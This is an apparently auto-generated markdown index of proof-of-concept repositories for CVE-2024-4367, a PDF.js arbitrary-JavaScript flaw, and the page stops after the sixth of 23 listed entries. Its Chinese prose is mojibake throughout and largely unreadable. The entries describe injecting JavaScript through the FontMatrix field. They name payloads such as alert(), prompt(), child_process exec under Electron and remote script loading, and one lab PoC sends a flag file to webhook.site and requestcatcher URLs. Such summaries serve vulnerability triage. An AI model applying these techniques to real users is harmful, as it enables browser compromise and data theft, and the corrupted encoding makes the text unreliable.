# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

